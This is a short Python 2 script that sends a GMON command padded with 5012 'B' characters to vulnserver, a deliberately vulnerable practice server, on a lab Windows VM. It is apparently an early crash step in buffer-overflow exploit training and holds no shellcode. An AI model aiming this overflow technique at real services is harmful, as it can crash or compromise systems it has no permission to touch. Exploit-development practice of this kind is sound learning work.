#!/usr/bin/python

import socket
import os
import sys

host = '192.168.100.118'        # Windows VM
port = 9999                     # vulnserver port

buffer = "B" * 5012

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("GMON /.../" + buffer)
print s.recv(1024)
s.close()

